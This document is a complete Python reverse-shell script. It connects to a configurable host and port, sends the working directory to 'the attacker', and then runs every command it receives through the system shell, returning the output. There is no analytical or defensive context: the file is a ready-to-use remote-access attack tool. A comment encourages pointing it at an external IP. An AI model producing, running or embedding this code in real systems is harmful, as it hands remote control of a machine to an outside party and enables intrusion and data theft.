#!/usr/bin/env python3

import socket
import subprocess
import os

# --- Configuration ---
TARGET_HOST = "127.0.0.1"  # Replace with your host IP if needed for external testing
TARGET_PORT = 12345        # You can choose any port above 1024

# --- Reverse Shell Logic ---
try:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((TARGET_HOST, TARGET_PORT))
    # At this point, the connection is established

    current_dir = os.getcwd()
    client_socket.send(current_dir.encode()) # Send current directory to the attacker

    while True:
        command = client_socket.recv(1024).decode().strip()

        if command.lower() == 'exit':
            break

        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_result = process.stdout.read()
        stderr_result = process.stderr.read()
        output = stdout_result + stderr_result

        client_socket.send(output)

except Exception as e:
    print(f"An error occurred: {e}")
finally:
    if 'client_socket' in locals():
        client_socket.close()
